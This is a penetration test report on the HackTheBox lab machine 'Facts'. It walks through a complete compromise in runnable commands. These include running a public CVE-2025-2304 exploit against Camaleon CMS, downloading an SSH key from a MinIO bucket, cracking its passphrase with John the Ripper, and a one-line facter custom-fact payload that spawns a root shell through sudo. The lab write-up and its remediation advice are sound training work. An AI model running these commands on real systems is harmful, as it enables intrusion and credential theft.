# PENETRATION TEST REPORT
## HackTheBox — Facts (Season 10)

| Field | Value |
|---|---|
| Date | 2026-03-24 |
| Target IP | [REDACTED] |
| Target Hostname | facts.htb |
| Tester | D24yK4r4 |
| Platform | HackTheBox — Season 10 |
| Difficulty | Easy |
| OS | Ubuntu 25.04 (Linux 6.14.0) |

---

## Executive Summary

This report documents the findings of a black-box penetration test conducted against the HackTheBox machine "Facts" (Season 10). The assessment simulated an external, unauthenticated attacker with no prior knowledge of the target environment.

The engagement resulted in full system compromise, achieving both user-level and root-level access. Three vulnerabilities were identified and exploited in a chained attack:

- **FACTS-001 (Critical)** — CVE-2025-2304: Privilege escalation in Camaleon CMS 2.9.0, allowing an authenticated low-privilege user to obtain admin rights and extract S3 credentials from the application configuration.
- **FACTS-002 (High)** — SSH private key stored in an insufficiently protected S3 bucket, recoverable after a trivial dictionary attack against the weak passphrase.
- **FACTS-003 (Critical)** — Passwordless sudo rule permitting execution of `/usr/bin/facter` as root, exploited via a malicious custom Ruby fact to obtain a root shell.

| Critical | High | Medium | Low |
|---|---|---|---|
| 2 | 1 | 0 | 0 |

---

## Scope & Methodology

### Scope

| Target | Ports | Notes |
|---|---|---|
| [REDACTED] | 22, 80, 54321 (all TCP) | Hostname: facts.htb |

### Methodology

The assessment followed a standard black-box approach:

- **Reconnaissance** — Full TCP port scan with service/version detection (Nmap `-sC -sV -p- -T4`)
- **Enumeration** — Web directory brute-forcing (Gobuster), CMS fingerprinting, MinIO S3 bucket enumeration via AWS CLI
- **Exploitation** — CVE-2025-2304 against Camaleon CMS; SSH key extraction from misconfigured S3 bucket; passphrase cracking via John the Ripper
- **Post-Exploitation** — sudo privilege enumeration; facter-based arbitrary code execution for root escalation

---

## Attack Narrative

### Phase 1 — Reconnaissance

A full TCP Nmap scan was performed against the target to enumerate open services and versions:

```
nmap -sC -sV -p- -T4 [REDACTED]
```

Three open ports were identified:

| Port | Service | Details |
|---|---|---|
| 22/tcp | SSH | OpenSSH 9.9p1 (Ubuntu) |
| 80/tcp | HTTP | nginx 1.26.3 — redirects to http://facts.htb/ |
| 54321/tcp | HTTP (MinIO) | MinIO S3-compatible object storage — redirects to port 9001 |

### Phase 2 — Web Enumeration

The `/etc/hosts` file was updated to resolve `facts.htb` to the target IP. Gobuster was used to brute-force web content on port 80:

```
gobuster dir -u http://facts.htb/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,bak,config
```

An `/admin` path was identified, redirecting to `http://facts.htb/admin/login`. This exposed a Camaleon CMS login panel, version 2.9.0. A test account was registered via the public registration endpoint and assigned the default 'client' role upon login.

### Phase 3 — Exploitation (CVE-2025-2304)

Camaleon CMS 2.9.0 is affected by CVE-2025-2304, a privilege escalation vulnerability caused by missing server-side authorisation checks on the role management API. An authenticated 'client' user can escalate to 'admin' by sending a crafted request. The admin session can then be used to extract S3 credentials from the application configuration.

```
git clone https://github.com/Alien0ne/CVE-2025-2304.git
python exploit.py -u http://facts.htb/ -U test -P test --newpass test -e -r
```

The exploit escalated the test account to admin and extracted the following S3 credentials from the CMS configuration:

```
s3 access key: [REDACTED]
s3 secret key: [REDACTED]
s3 endpoint:   http://localhost:54321
```

### Phase 4 — S3 Bucket Enumeration & SSH Key Extraction

The extracted credentials were configured in the AWS CLI to interact with the MinIO instance on port 54321:

```
aws configure
aws --endpoint-url http://facts.htb:54321 s3 ls
```

Two buckets were discovered: `internal` and `randomfacts`. The `internal` bucket contained an `.ssh` directory with an SSH private key and associated `authorized_keys` file:

```
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_keys ./authorized_keys
```

The `authorized_keys` file confirmed the key was authorised for an account on the target. The private key was in Ed25519 format and protected by a passphrase.

### Phase 5 — Passphrase Recovery & Initial Access

The private key was converted to a John-compatible hash using `ssh2john`, then subjected to a dictionary attack against `rockyou.txt`:

```
ssh2john id_ed25519 > id_ed25519.hash
john id_ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The passphrase was recovered in approximately 78 seconds. Correct permissions were set on the key file before use:

```
chmod 600 id_ed25519
ssh -i id_ed25519 trivia@facts.htb
```

SSH access was established as user `trivia`. The user flag was retrieved from `/home/william/user.txt`, which was world-readable.

### Phase 6 — Privilege Escalation (facter sudo misconfiguration)

Sudo privileges were enumerated for the trivia account:

```
sudo -l
# (ALL) NOPASSWD: /usr/bin/facter
```

Facter is a Ruby-based system information tool (part of the Puppet ecosystem) that supports user-defined 'custom facts' — arbitrary Ruby scripts loaded at runtime via the `--custom-dir` flag. Since facter was permitted to run as root, a malicious custom fact was placed in `/tmp` and loaded via sudo:

```
echo 'Facter.add(:pwn) do setcode { exec("/bin/bash -p") } end' > /tmp/pwn.rb
sudo facter --custom-dir=/tmp pwn
```

This spawned a root shell. The root flag was retrieved from `/root/root.txt`.

---

## Findings

### FACTS-001 — Authenticated Privilege Escalation (CVE-2025-2304, Camaleon CMS 2.9.0)

| Field | Value |
|---|---|
| Finding ID | FACTS-001 |
| Severity | **Critical** |
| CWE | CWE-285 — Improper Authorisation |
| OWASP | A01:2021 — Broken Access Control |
| CVSS Score | 9.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |

**Description**

Camaleon CMS version 2.9.0 contains a privilege escalation vulnerability in its user role management API. An authenticated user with the 'client' role can send a crafted API request to elevate their account to 'admin' due to absent server-side authorisation checks. The elevated session can be used to access sensitive application configuration, including S3/MinIO credentials stored in cleartext.

**Impact**

Any user with a valid CMS account can obtain full administrative access and extract credentials granting access to internal object storage. In this engagement, the extracted S3 credentials provided access to an SSH private key, enabling initial system access.

**Steps to Reproduce**

```
# Register a low-privilege account on the Camaleon CMS instance
# Clone and execute the public CVE-2025-2304 proof-of-concept:
git clone https://github.com/Alien0ne/CVE-2025-2304.git
python exploit.py -u http://facts.htb/ -U test -P test --newpass test -e -r
# The exploit escalates the account to admin and extracts S3 credentials.
```

**Remediation**

Upgrade Camaleon CMS to a patched version. Implement and enforce server-side authorisation checks on all role management endpoints. Do not store S3 credentials or other secrets in CMS configuration accessible via the admin panel — use a secrets manager or environment variables instead. Rotate all exposed credentials immediately.

---

### FACTS-002 — SSH Private Key Exposed in S3 Bucket with Weak Passphrase

| Field | Value |
|---|---|
| Finding ID | FACTS-002 |
| Severity | **High** |
| CWE | CWE-312 — Cleartext Storage of Sensitive Information |
| OWASP | A02:2021 — Cryptographic Failures |
| CVSS Score | 7.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) |

**Description**

An Ed25519 SSH private key (`id_ed25519`) was stored in the `internal` MinIO S3 bucket under an `.ssh/` directory, accessible to any party holding the S3 credentials. The key was protected by a passphrase; however, the passphrase was a common dictionary word and was recovered in under two minutes using John the Ripper against the `rockyou.txt` wordlist.

**Impact**

An attacker who obtains the S3 credentials (e.g., via FACTS-001) can download the private key and quickly recover the passphrase, gaining SSH access to the system as the `trivia` user. This enabled user-flag retrieval and served as the entry point for the privilege escalation chain.

**Steps to Reproduce**

```
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
ssh2john id_ed25519 > id_ed25519.hash
john id_ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt
# Passphrase recovered: [REDACTED]
chmod 600 id_ed25519
ssh -i id_ed25519 trivia@facts.htb
```

**Remediation**

Do not store private SSH keys in S3 buckets or other shared storage. If object storage use is operationally required, enforce strict bucket policies to limit access and use a strong, randomly generated passphrase (minimum 16 characters). Rotate the exposed key pair immediately and audit all systems that accepted the compromised key.

---

### FACTS-003 — Local Privilege Escalation via Unsafe sudo Rule (/usr/bin/facter)

| Field | Value |
|---|---|
| Finding ID | FACTS-003 |
| Severity | **Critical** |
| CWE | CWE-269 — Improper Privilege Management |
| OWASP | A05:2021 — Security Misconfiguration |
| CVSS Score | 8.8 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |

**Description**

The system user `trivia` was configured with a passwordless sudo rule permitting execution of `/usr/bin/facter` as any user, including root. Facter supports user-defined custom facts — arbitrary Ruby scripts loaded at runtime via the `--custom-dir` flag. Because facter executes these scripts in-process and was permitted to run as root, an attacker with local access as `trivia` could trivially obtain a root shell by placing a malicious Ruby file in any writable directory and invoking facter with sudo.

**Impact**

Full system compromise. An attacker with local access as `trivia` can obtain an unrestricted root shell, gaining access to all files, processes, credentials, and system configuration on the host.

**Steps to Reproduce**

```
sudo -l
# Output: (ALL) NOPASSWD: /usr/bin/facter

# Write malicious custom fact to a world-writable directory
echo 'Facter.add(:pwn) do setcode { exec("/bin/bash -p") } end' > /tmp/pwn.rb

# Execute facter as root, loading the malicious fact
sudo facter --custom-dir=/tmp pwn

whoami
# root
```

**Remediation**

Remove the passwordless sudo rule for facter. If facter must run with elevated privileges for legitimate operational reasons, restrict the `--custom-dir` argument to a specific path owned by root and not writable by unprivileged users. Apply the principle of least privilege to all sudo rules and audit the sudoers configuration regularly.

---

## Findings Summary

| ID | Severity | Title | OWASP |
|---|---|---|---|
| FACTS-001 | Critical | CVE-2025-2304 — Camaleon CMS Privilege Escalation | A01:2021 |
| FACTS-002 | High | SSH Private Key Exposed in S3 Bucket (Weak Passphrase) | A02:2021 |
| FACTS-003 | Critical | Local Privilege Escalation via sudo facter Misconfiguration | A05:2021 |

---

## Proof of Exploitation

| Flag | User | Path |
|---|---|---|
| User Flag | trivia (read from /home/william) | [REDACTED] |
| Root Flag | root | [REDACTED] |

---

## Tools Used

| Tool | Purpose |
|---|---|
| Nmap 7.98 | Full TCP port scan, service and version detection |
| Gobuster 3.8.2 | Web directory and file brute-forcing |
| CVE-2025-2304 PoC | Camaleon CMS privilege escalation and S3 credential extraction |
| AWS CLI | MinIO S3 bucket enumeration and file download |
| ssh2john | SSH private key to John-compatible hash conversion |
| John the Ripper | Dictionary attack against SSH key passphrase |
| OpenSSH | Remote shell access via recovered private key |
| facter (GTFOBin) | Root privilege escalation via sudo misconfiguration |
